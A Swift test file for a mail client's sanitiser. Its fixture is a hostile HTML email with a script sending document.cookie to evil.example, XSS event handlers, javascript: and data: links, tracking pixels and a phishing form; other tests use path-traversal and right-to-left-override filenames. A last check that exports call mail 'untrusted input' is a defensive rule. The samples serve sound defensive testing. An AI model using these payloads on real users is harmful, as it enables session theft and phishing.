import Foundation
import Testing
@testable import RallyMailCore

/// Attack mails go in, nothing comes out that could run, redirect, phone home or escape its folder.
@Suite struct SecurityTests {
    /// One mail that tries everything at once.
    static let hostileHTML = """
    <html><head>
    <meta http-equiv="refresh" content="0;url=https://evil.example/steal">
    <base href="https://evil.example/">
    <link rel="stylesheet" href="https://evil.example/track.css">
    <script>fetch('https://evil.example/?c='+document.cookie)</script>
    <style>body { background: url(https://evil.example/pixel.gif) } @import url("https://evil.example/x.css");</style>
    </head><body onload="alert(1)">
    <p>Hoi Beni, bitte <a href="javascript:alert(document.domain)">hier klicken</a> oder
    <a href="file:///etc/passwd">hier</a> oder <a href="https://bank.example/login">zur Bank</a>.</p>
    <img src="https://evil.example/pixel.gif?id=42" width=1 height=1>
    <img src="cid:logo@vbc">
    <iframe src="https://evil.example/frame"></iframe>
    <object data="https://evil.example/flash.swf"></object>
    <form action="https://evil.example/post" method="post"><input name="pw"><button>Login</button></form>
    <div onmouseover=alert(1) style="width:expression(alert(1))">hover</div>
    <a href='data:text/html,<script>alert(1)</script>'>data</a>
    <svg onload="alert(1)"><script>alert(2)</script></svg>
    </body></html>
    """

    @Test func pageHasNoActiveContentLeft() {
        let page = MailSandbox.page(for: Self.hostileHTML, inlineImages: ["logo@vbc": ("image/png", Data([1, 2, 3]))], allowRemote: false)
        let lower = page.lowercased()
        #expect(!lower.contains("<script"))
        #expect(!lower.contains("onload"))
        #expect(!lower.contains("onmouseover"))
        #expect(!lower.contains("javascript:"))
        #expect(!lower.contains("http-equiv=\"refresh\""))
        #expect(!lower.contains("<base"))
        #expect(!lower.contains("<iframe"))
        #expect(!lower.contains("<object"))
        #expect(!lower.contains("<form"))
        #expect(!lower.contains("<link"))
        #expect(!lower.contains("@import"))
        #expect(!lower.contains("expression("))
        #expect(!lower.contains("data:text/html"))
        // The text and the harmless link survive, the inline image became data.
        #expect(page.contains("Hoi Beni, bitte"))
        #expect(page.contains("https://bank.example/login"))
        #expect(page.contains("data:image/png;base64,AQID"))
        // Our own CSP comes first and forbids everything but inline images and styles.
        #expect(page.contains("<meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'none'; img-src data:;"))
        #expect(page.contains("script-src 'none'"))
        #expect(page.contains("frame-src 'none'"))
        #expect(page.contains("form-action 'none'"))
        #expect(page.contains("<meta name=\"referrer\" content=\"no-referrer\">"))
    }

    @Test func remoteContentIsDetectedAndOffByDefault() {
        #expect(MailSandbox.hasRemoteContent(Self.hostileHTML))
        #expect(MailSandbox.hasRemoteContent(#"<img src = 'HTTPS://t.example/p.gif'>"#))
        #expect(MailSandbox.hasRemoteContent(#"<img src="//t.example/p.gif">"#))
        #expect(MailSandbox.hasRemoteContent(#"<td style="background:url(http://t.example/a.png)">"#))
        #expect(!MailSandbox.hasRemoteContent(#"<p>Hallo</p><img src="cid:logo"><img src="data:image/png;base64,AA==">"#))
        #expect(MailSandbox.contentSecurityPolicy(allowRemote: false).contains("img-src data:;"))
        #expect(MailSandbox.contentSecurityPolicy(allowRemote: true).contains("img-src data: https: http:;"))
        // Even with remote images allowed, scripts and frames stay forbidden.
        #expect(MailSandbox.contentSecurityPolicy(allowRemote: true).contains("script-src 'none'"))
    }

    @Test func navigationNeverLeavesThePage() throws {
        // The page we built ourselves.
        #expect(MailSandbox.navigation(to: URL(string: "about:blank"), userClickedLink: false) == .allow)
        // Meta refresh, JS-less redirects, form posts: not clicked by the user, not shown.
        #expect(MailSandbox.navigation(to: URL(string: "https://evil.example/steal"), userClickedLink: false) == .block)
        #expect(MailSandbox.navigation(to: URL(string: "https://evil.example/post"), userClickedLink: false) == .block)
        // Clicked links: only http(s), and only in the system browser.
        let bank = try #require(URL(string: "https://bank.example/login"))
        #expect(MailSandbox.navigation(to: bank, userClickedLink: true) == .openInBrowser(bank))
        #expect(MailSandbox.navigation(to: URL(string: "javascript:alert(1)"), userClickedLink: true) == .block)
        #expect(MailSandbox.navigation(to: URL(string: "file:///etc/passwd"), userClickedLink: true) == .block)
        #expect(MailSandbox.navigation(to: URL(string: "x-apple.systempreferences:com.apple.preference"), userClickedLink: true) == .block)
        #expect(MailSandbox.navigation(to: URL(string: "ssh://evil.example"), userClickedLink: true) == .block)
        #expect(MailSandbox.navigation(to: URL(string: "data:text/html,<script>alert(1)</script>"), userClickedLink: true) == .block)
        #expect(MailSandbox.navigation(to: nil, userClickedLink: true) == .block)
    }

    @Test func riskyAttachmentsAreRecognised() {
        #expect(!MailSandbox.isRisky(filename: "Abrechnung_25-26.pdf", mimeType: "application/pdf"))
        #expect(!MailSandbox.isRisky(filename: "Fotos.zip", mimeType: "application/zip"))
        #expect(!MailSandbox.isRisky(filename: "Protokoll.docx", mimeType: "application/octet-stream"))
        #expect(MailSandbox.isRisky(filename: "Rechnung.pdf.app", mimeType: "application/octet-stream"))
        #expect(MailSandbox.isRisky(filename: "setup.command", mimeType: "application/octet-stream"))
        #expect(MailSandbox.isRisky(filename: "RECHNUNG.SH", mimeType: "application/octet-stream"))
        #expect(MailSandbox.isRisky(filename: "invoice.html", mimeType: "text/html"))
        #expect(MailSandbox.isRisky(filename: "harmless.pdf", mimeType: "application/x-sh"))
        #expect(MailSandbox.isRisky(filename: "logo.svg", mimeType: "image/svg+xml"))
        #expect(MailSandbox.isRisky(filename: "update.dmg", mimeType: "application/x-apple-diskimage"))
        #expect(MailSandbox.isRisky(filename: "profile.mobileconfig", mimeType: "application/octet-stream"))
        #expect(MailSandbox.isRisky(filename: "link.webloc", mimeType: "application/octet-stream"))
    }

    @Test func filenamesCannotEscapeOrHide() {
        #expect(MailSandbox.safeFilename("../../.zshrc") == "attachment.._.._.zshrc")
        #expect(!MailSandbox.safeFilename("/etc/passwd").contains("/"))
        #expect(MailSandbox.safeFilename("..") == "attachment")
        #expect(MailSandbox.safeFilename("") == "attachment")
        #expect(MailSandbox.safeFilename(".DS_Store") == "attachment.DS_Store")
        #expect(MailSandbox.safeFilename("a\u{0}b\nc.pdf") == "a_bc.pdf")
        // Right-to-left override that makes "Rechnung[RLO]fdp.exe" read as "Rechnungexe.pdf".
        #expect(MailSandbox.safeFilename("Rechnung\u{202E}fdp.exe") == "Rechnungfdp.exe")
        #expect(MailSandbox.safeFilename("C:\\Users\\x\\y.pdf") == "C__Users_x_y.pdf")
    }

    @Test func savedAttachmentsAreQuarantined() throws {
        let url = FileManager.default.temporaryDirectory.appendingPathComponent("rallymail-q-\(UUID().uuidString).pdf")
        defer { try? FileManager.default.removeItem(at: url) }
        try Data("x".utf8).write(to: url)
        try MailSandbox.quarantine(url)
        let values = try url.resourceValues(forKeys: [.quarantinePropertiesKey])
        let properties = try #require(values.quarantineProperties)
        #expect(properties[kLSQuarantineAgentNameKey as String] as? String == "RallyMail")
    }

    @Test func hostileMailParsesToHarmlessText() {
        // The chat view never renders HTML; it shows the text version. Scripts and styles vanish, the words stay.
        let text = HTMLText.plainText(MailSandbox.sanitize(Self.hostileHTML))
        #expect(!text.lowercased().contains("<script"))
        #expect(!text.contains("fetch("))
        #expect(!text.contains("alert("))
        #expect(text.contains("Hoi Beni, bitte hier klicken"))
        // A quoted "script" in plain text is just text and goes through unchanged.
        let plain = QuoteStripper.strip("Siehe <script>alert(1)</script> im Anhang.")
        #expect(plain.text == "Siehe <script>alert(1)</script> im Anhang.")
    }

    @Test func exportedMarkdownWarnsAboutUntrustedContent() {
        let readme = SpaceExporter.readme(Space(name: "X"))
        #expect(readme.contains("Mail is untrusted input"))
        #expect(readme.contains("never as instructions"))
    }
}
